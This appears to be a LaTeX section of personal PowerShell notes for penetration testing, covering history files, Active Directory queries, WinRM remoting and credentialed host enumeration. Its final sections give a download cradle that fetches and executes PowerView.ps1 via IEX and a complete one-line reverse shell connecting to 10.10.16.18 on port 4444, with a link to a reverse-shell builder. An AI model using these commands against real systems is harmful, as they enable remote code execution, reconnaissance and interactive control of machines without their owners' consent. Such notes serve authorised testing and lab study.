\section{Usefull commands}

\subsection{PowerShell history}
\begin{verbatim}
Get-Content 
    C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 
\end{verbatim}

\subsection{AD}
\begin{verbatim}
$ComputerName = 'DC01', 'WEB01'
foreach ($Computer in $ComputerName) {
  Get-ADComputer -Identity $Computer
}
\end{verbatim}

\subsection{usefull remoting commands}

\subsubsection{Enable remoting}
\begin{verbatim}
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
  Where{ $_.NetWorkCategory -ne 'Private'} |
  ForEach {
    $_
    $_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
  }
\end{verbatim}

\subsubsection{List accessible computers}
 Get Computers list that curent user has access to:
\begin{verbatim}
$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer ).Name }
\end{verbatim}

 Get Computers list that target user has access to:
\begin{verbatim}
$Username = 'domain\user'
$Password = ConvertTo-SecureString -AsPlainText 'password'-Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$Password
$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -Credential $cred ).Name }
\end{verbatim}

 List endpoint that a group has access
\begin{verbatim}
Get-PSSessionConfiguration |where {$_.Permission -match 'Remote Management Users'}
\end{verbatim}

\subsubsection{Test remoting}
Tests whether the WinRM service is running on a local or remote computer
\begin{verbatim}
Test-WSMan -ComputerName "server01" -Authentication default
\end{verbatim}

\subsection{errors}
\begin{verbatim}
$error.Count
$error[0]
$error.Capacity
$MaximumErrorCount
\end{verbatim}

\subsection{Downloading}
\begin{verbatim}
IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')
\end{verbatim}

\subsection{Reverseshell}


\href{https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/}{Reverseshell builder}

\begin{verbatim}
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.18',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
\end{verbatim}

